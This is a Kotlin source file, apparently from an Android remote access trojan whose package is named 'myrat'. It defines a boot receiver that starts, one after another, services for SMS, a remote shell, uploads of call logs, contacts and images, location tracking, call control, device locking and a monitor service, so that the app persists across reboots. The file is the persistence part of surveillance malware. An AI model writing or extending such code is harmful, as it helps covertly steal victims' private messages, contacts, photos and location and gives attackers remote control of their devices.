package com.myrat.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import com.myrat.app.service.CallLogUploadService
import com.myrat.app.service.CallService
import com.myrat.app.service.ContactUploadService
import com.myrat.app.service.ImageUploadService
import com.myrat.app.service.LocationService
import com.myrat.app.service.LockService
import com.myrat.app.service.ServiceMonitorService
import com.myrat.app.service.ShellService
import com.myrat.app.service.SmsService
import com.myrat.app.service.SmsConsentService
import com.myrat.app.utils.Logger

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        try {
            if (Intent.ACTION_BOOT_COMPLETED == intent?.action || Intent.ACTION_LOCKED_BOOT_COMPLETED == intent?.action) {
                Logger.log("Boot completed, starting all services with delay")
                
                // Add delay to ensure system is ready
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    startAllServices(context)
                }, 10000) // 10 second delay for system stability
            }
        } catch (e: Exception) {
            Logger.error("Error in BootReceiver", e)
        }
    }
    
    private fun startAllServices(context: Context) {
        try {
            val services = listOf(
                SmsService::class.java,
                ShellService::class.java,
                CallLogUploadService::class.java,
                ContactUploadService::class.java,
                ImageUploadService::class.java,
                LocationService::class.java,
                CallService::class.java,
                LockService::class.java,
                SmsConsentService::class.java,
                ServiceMonitorService::class.java // Start monitor last
            )

            services.forEachIndexed { index, serviceClass ->
                try {
                    // Add small delay between service starts
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        try {
                            val serviceIntent = Intent(context, serviceClass)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                context.startForegroundService(serviceIntent)
                            } else {
                                context.startService(serviceIntent)
                            }
                            Logger.log("Started ${serviceClass.simpleName} on boot")
                        } catch (e: Exception) {
                            Logger.error("Failed to start ${serviceClass.simpleName} on boot", e)
                        }
                    }, (index * 1000).toLong()) // 1 second delay between each service
                } catch (e: Exception) {
                    Logger.error("Failed to schedule ${serviceClass.simpleName} on boot", e)
                }
            }
            
            Logger.log("All services scheduled to start on boot")
        } catch (e: Exception) {
            Logger.error("Error starting services on boot", e)
        }
    }
}